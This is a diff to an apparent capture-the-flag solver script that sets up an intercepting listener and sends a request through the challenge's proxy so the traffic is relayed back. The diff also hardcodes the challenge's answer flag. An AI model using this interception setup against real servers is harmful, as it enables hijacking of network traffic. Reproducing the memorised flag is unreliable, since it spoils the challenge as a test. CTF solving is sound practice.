@@ -1,19 +1,23 @@
-import requests, socket #threading
+import requests, socket
 from multiprocessing.pool import ThreadPool
 
-def solve():
+def solve() -> bool:
     flag = "magpie{m4n_1n_th3_m1ddl3}"
 
-    challenge_host = "159.89.138.239"
+    challenge_host = "net01.magpiectf.ca"
     challenge_port = 3665
-    proxy_host = "http://159.89.138.239:1337"
+    proxy_host = "http://net01.magpiectf.ca:1337"
 
-    my_host = "http://50.66.61.109"
+    # The public IP of the computer running this script
+    # The my_port port must be port forwarded in the router
+    my_host = "http://xxx.xxx.xxx.xxx"
     my_port = 5665
 
+    # Create intercept proxy thread
     pool = ThreadPool(processes=1)
     proxy = pool.apply_async(proxy_thread, (my_port, challenge_host, challenge_port))
 
+    # Send request to intercept proxy
     r = requests.get(my_host + ":" + str(my_port), proxies={"http": proxy_host})
 
     proxy_data = proxy.get()
@@ -47,5 +51,3 @@ def proxy_thread(my_port, challenge_host, challenge_port):
     s.close()
 
     return data.decode()
-
-solve()
